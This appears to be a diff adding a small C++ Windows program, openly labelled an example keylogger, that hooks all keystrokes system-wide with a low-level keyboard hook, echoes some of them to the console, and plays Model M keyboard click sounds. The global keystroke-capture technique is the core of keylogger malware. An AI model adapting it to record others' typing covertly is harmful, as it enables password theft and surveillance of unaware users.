@@ -1,0 +1,58 @@
+/*********************************************************
+ * Author:		Nico Richard (NRichard)
+ * Purpose 1:	Example keylogger
+ * Purpose 2:	Simulate the sounds of a Model M Keyboard
+ *
+ * Note:		Annoying
+ *********************************************************/
+#include <stdio.h>
+#include <windows.h>
+
+#include <irrKlang.h>
+#include <sstream>
+#pragma comment(lib, "irrKlang.lib")
+using namespace irrklang;
+ISoundEngine* sndEngine;
+
+LRESULT CALLBACK LowLevelKeyboardProc( int nCode, WPARAM wParam, LPARAM lParam ){
+	//Keylogger
+	KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;
+	switch( wParam ){
+	case WM_KEYUP: {
+		if(pKeyBoard->vkCode == VK_RETURN)			printf("\n");
+		else if (pKeyBoard->vkCode == VK_SPACE)		printf(" ");
+		else if (pKeyBoard->vkCode == VK_TAB)		printf("    ");
+		else {
+			BYTE keyboard_state[256];
+			WORD wCharacter = 0;
+			GetKeyboardState(keyboard_state);
+			ToAscii((UINT)pKeyBoard->vkCode, pKeyBoard->scanCode,keyboard_state, &wCharacter, 0);
+		}
+
+	//Model M Simulator
+		std::stringstream ss; ss << "..\\sound\\" << 1 + rand() % 10 << ".mp3";
+		sndEngine->play2D(ss.str().c_str());
+	}
+	default:
+		return CallNextHookEx( NULL, nCode, wParam, lParam );
+	}
+	return 0;
+}
+
+int main() {
+	//Initialize sound engine for Model M Sim
+	sndEngine = createIrrKlangDevice();
+	if (!sndEngine)
+		return 0; // error starting up the engine
+
+	// Retrieve the applications instance and set a global Windows Hook to capture keystrokes.
+	HINSTANCE appInstance = GetModuleHandle(NULL);
+	SetWindowsHookEx( WH_KEYBOARD_LL, LowLevelKeyboardProc, appInstance, 0 );
+	MSG msg;
+	while(GetMessage(&msg, NULL, 0, 0) > 0){
+			TranslateMessage(&msg);
+			DispatchMessage(&msg);
+	}
+	sndEngine->drop(); // delete engine
+return 0;
+}
